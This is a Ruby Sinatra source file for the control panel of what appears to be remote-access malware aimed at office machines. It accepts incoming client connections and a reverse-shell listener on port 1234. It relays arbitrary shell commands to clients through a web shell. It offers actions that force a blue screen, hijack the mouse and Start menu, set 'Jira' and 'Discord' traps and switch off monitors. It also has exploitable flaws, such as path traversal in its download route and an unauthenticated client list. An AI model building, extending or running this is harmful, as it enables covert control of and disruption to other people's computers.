require_relative('app/controllers/application_controller')

#TCP Server variables
$stdout.sync = true
server = TCPServer.new('0.0.0.0', 55555)
$shell = TCPServer.new('0.0.0.0', 1234)

#Threads variables
$loopThread = Thread.new { sleep }
$shellThread = Thread.new { sleep }
$semaphore = Mutex.new

#Global lists
$clientsList = []
$shellList = []

$loopThread = Thread.new {
  loop do
    Thread.start(server.accept) do |client|
      begin
        #Always need to synchronize global array
        $semaphore.synchronize { $clientsList << Client.new(client) }
        threadNum = Client.num
        while line = client.gets
          if line[0..10] == "Polaczono z"
            @name = line[12..-2]
            $semaphore.synchronize {
              $clientsList[threadNum].name = @name.slice((0..@name.index('VER')-2))
              $clientsList[threadNum].ver = @name.slice((@name.index('VER')+5..-1)).to_f }
            if $clientsDB.select(:ip).where(:ip => client.addr.last).first.nil?
              add_client(client.addr.last , @name.slice((0..@name.index('VER')-2)))
            end
          end
        end
      rescue
        Client.dead
      end
    end
  end
  server.close
}

$shellThread = Thread.new {
  loop do
    Thread.start($shell.accept) do |sClient|
      @newClietnIp = sClient.addr.last
      clientPos = $clientsList.find{ |n| n.ip == @newClietnIp }.id
      begin
        $shellList[clientPos] = sClient
      rescue
      end
    end
  end
}

class MyServer < Sinatra::Base

  enable :sessions

  configure do
    set :run            , 'true'
    set :public_folder  , 'public'
    set :views          , 'app/views'
    set :port           , '4567'
    set :bind           , '0.0.0.0'
    set :show_exceptions, 'true' #Those are errors
  end

  get '/' do
    if current_user
      @js = ["home-js"]
      erb :home
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  get '/list' do
    p $clientsList
  end

  get '/users' do
    if current_user.isAdmin?
      @css = ["users-styles"]
      erb :users
    elsif current_user
      @error = "This is admin only area."
      erb :home
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  get '/refresh' do
    $clientsList.each {|k| if !k.nil? then k.close end }
    $shellList.each { |k| if !k.nil? then k.close end }
    @js = ["home-js"]
    erb :home
  end

  get '/download/:filename' do |filename|
    send_file "./files/#{filename}", :filename => filename, :type => 'Application/octet-stream'
  end

  get '/show_qr' do
    generate_qr(params)
    @css = ["show_qr-styles"]
    erb :show_qr, locals: { params: params }
  end

  get '/panel' do
    if current_user
      if params.empty? || $clientsList[params[:client].to_i].nil?
        @error = "Did not found client!"
        erb :home
      else
        @css = ["panel-styles"]
        @js = ["panel-js"]
        erb :panel, locals: { params: params }
      end
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  get '/photos' do
    if current_user
      if params.empty? || $clientsList[params[:client].to_i].nil?
        @error = "Did not found client!"
        erb :home
      else
        @css = ["photos-styles"]
        @js = ["photos-js"]
        erb :photos, locals: { params: params }
      end
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  post '/upload' do
    if current_user
      @file = params[:file][:tempfile]
      @file_name = params[:file][:filename].tr_s(" ", "_")
      if !File.exists?("./public/images/avatars/#{@file_name}")
        File.open("./public/images/avatars/#{@file_name}", 'wb') do |f|
          f.write(@file.read)
        end
      end
      @css = ["photos-styles"]
      @js = ["photos-js"]
      erb :photos, locals: { params: params }
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  post '/photo_choosen' do
    if current_user
      if !params[:avatar].nil?
          update_photo(params)
      end
      @js = ["home-js"]
      erb :home
    else
      @css = ["login-styles"]
      erb :login
    end
  end

 post '/edit_name' do
  if current_user
    edit_name(params)
    @js = ["home-js"]
    erb :home
  else
    @css = ["login-styles"]
    erb :login
    end
  end

  post '/vcontrol' do
    if current_user
      if params.empty? || $clientsList[params[:client_id].to_i].nil?
        @error = "Did not found client!"
        erb :home
      else
        @mClient = $clientsList[params[:client_id].to_i]
        case params[:request]
        when "volup"
          $semaphore.synchronize { @mClient.volume_up }
        when "voldw"
          $semaphore.synchronize { @mClient.volume_down }
        when "mute"
          $semaphore.synchronize { @mClient.volume_mute }
        end
      end
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  get '/webshell' do
    if current_user
      if params.empty? || $clientsList[params[:client_id].to_i].nil?
        @error = "Did not found client!"
        erb :home
      else
        @mClient = $clientsList[params[:client_id].to_i]
        $semaphore.synchronize { @mClient.shell }
      end
      @css = ["webshell-styles"]
      @js = ["webshell-js"]
      erb :webshell, locals: { params: params }
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  post '/webshell' do
    if current_user
      @retmsg = []
      shellClient = $shellList[params[:client_id].to_i]
      shellClient.puts(params[:command])
      begin
      status = Timeout::timeout(1) {
        while line = shellClient.gets
          @retmsg << line
        end
      }
      rescue
      end
      return @retmsg
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  get '/volcontrol' do
    if current_user
      @css = ["vol_control-styles","site-after-styles"]
      erb :vol_control, locals: { params: params }
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  get '/generate_error' do
    if current_user
      @css = ["error-generator-styles","site-after-styles"]
      erb :error_generator, locals: { params: params }
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  post '/generate_error' do
    if current_user
      if params.empty? || $clientsList[params[:client_id].to_i].nil?
        @error = "Did not found client!"
        erb :home
      else
        @mClient = $clientsList[params[:client_id].to_i]
        @text = params[:text].gsub(";","")
        @title = params[:title].gsub(";","")
        if @text.empty?
          @text = " "
        end
        if @title.empty?
          @title = " "
        end
        @sendText = "#{@text};#{@title};"
        if !params[:buttons].nil?
          @sendText = @sendText + params[:buttons]
        else
          @sendText = @sendText + "0"
        end
        if !params[:icons].nil?
          @sendText = @sendText + ";" + params[:icons]
        end
        if params[:text].length > 1000 || params[:title].length > 100
          @error = "Params too long!"
        else
          puts @sendText
          $semaphore.synchronize { @mClient.send_error(@sendText) }
        end
      end
      @css = ["panel-styles"]
      erb :panel, locals: { params: params }
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  post '/execute' do
    if current_user
      if params.empty? || $clientsList[params[:client_id].to_i].nil?
        @error = "Did not found client!"
        erb :home
      else
        @mClient = $clientsList[params[:client_id].to_i]
        case params[:request]
        when "shell"
          $semaphore.synchronize { @mClient.shell }
          @msg = "Trying open shell on port 1234 from #{@mClient.name}."
        when "get-mouse"
          if @mClient.isMouseTaken == 0
            $semaphore.synchronize { @mClient.get_mouse }
            @msg = "Trying to get mouse on #{@mClient.name}."
          else
            $semaphore.synchronize { @mClient.give_mouse_back }
            @msg = "Giving mouse back to #{@mClient.name}."
          end
        when "trap-jira"
          if @mClient.isJiraTrapSet == 0
            $semaphore.synchronize { @mClient.trap_on_jira }
            @msg = "Settting on Jira trap on #{@mClient.name}."
          else
            $semaphore.synchronize { @mClient.trap_off_jira }
            @msg = "Killing Jira trap on #{@mClient.name}."
          end
        when "take-over-menustart"
          if @mClient.isMenuStartTaken == 0
            $semaphore.synchronize { @mClient.get_menu_start }
            @msg = "Killing Menu Start on #{@mClient.name}."
          else
            $semaphore.synchronize { @mClient.give_back_start }
            @msg = "Giving back Menu Start on #{@mClient.name}."
          end
        when "swap-mouse-keys"
          if @mClient.areMouseButtonsSwapped == 0
            $semaphore.synchronize { @mClient.swap_mouse }
            @msg = "Mouse Keys has been swapped on #{@mClient.name}."
          else
            $semaphore.synchronize { @mClient.swap_mouse_back }
            @msg = "Mouse keys set on normal on #{@mClient.name}."
          end
        when "set-discord-trap"
          if @mClient.isDiscordTrapSet == 0
            $semaphore.synchronize { @mClient.set_discord_trap }
            @msg = "Settin on Discord Trap on #{@mClient.name}."
          else
            $semaphore.synchronize { @mClient.discard_discord_trap }
            @msg = "Turning off Discord Trap on #{@mClient.name}."
          end
        when "melt-monitor"
          $semaphore.synchronize { @mClient.melt_monitor }
          @msg = "Trying to melt #{@mClient.name}\'s screen. \n
          WARNING: This function has first false positive!"
        when "bsod"
          $semaphore.synchronize { @mClient.bsod }
          @msg = "Trying... nevermind, #{@mClient.name} is just dead."
        when "turnoffMonitor"
          $semaphore.synchronize { @mClient.turn_off_monitor }
          @msg = "Turning off monitor on #{@mClient.name}..."
        else
          @msg = "Błedne polecenie."
        end
        @css = ["site-after-styles"]
        erb :site_after, locals: { params: params }
      end
    else
      @css = ["login-styles"]
      erb :login
    end
  end

  get '/logout' do
    session.clear
    redirect '/'
  end

  get '/login' do
    @css = ["login-styles"]
    erb :login
  end

  get '/user_login' do
    if !params[:username].empty? && !params[:hotp].empty?
      $usersDB.map do |user|
        if params[:username] == user[:username]
          hotp = ROTP::HOTP.new(user[:twofaKey], issuer: user[:username])
          hotpKey = hotp.at(user[:is2FA])
          if hotpKey == params[:hotp]
            session.clear
            session[:user_id] = user[:id]
            redirect '/'
          else
            @css = ["login-styles"]
            @error = "Invalid password."
            erb :login
          end
        end
      end
      session.clear
      @error = 'Username or password was incorrect.'
      @css = ["login-styles"]
      erb :login
    end
  end

  post '/login' do
    if !params[:username].empty? && !params[:password].empty?
      $usersDB.map do |user|
        if params[:username] == user[:username]
          pass_t = user[:password_hash]
          if test_password(params[:password], pass_t)
            session.clear
            session[:user_id] = user[:id]
            redirect '/'
          else
            @css = ["login-styles"]
            @error = "Invalid password."
            erb :login
          end
        end
      end
      session.clear
      @error = 'Username or password was incorrect.'
      @css = ["login-styles"]
      erb :login
    else
      @css = ["login-styles"]
      @error = "Complete all fields on the form."
      erb :login
    end
  end

  helpers do
    def current_user
      if session[:user_id]
        $usersDB.where(:id => session[:user_id]).all[0]
      else
        nil
      end
    end
  end

  not_found do
    status 404
    redirect '/'
  end

  run!
end
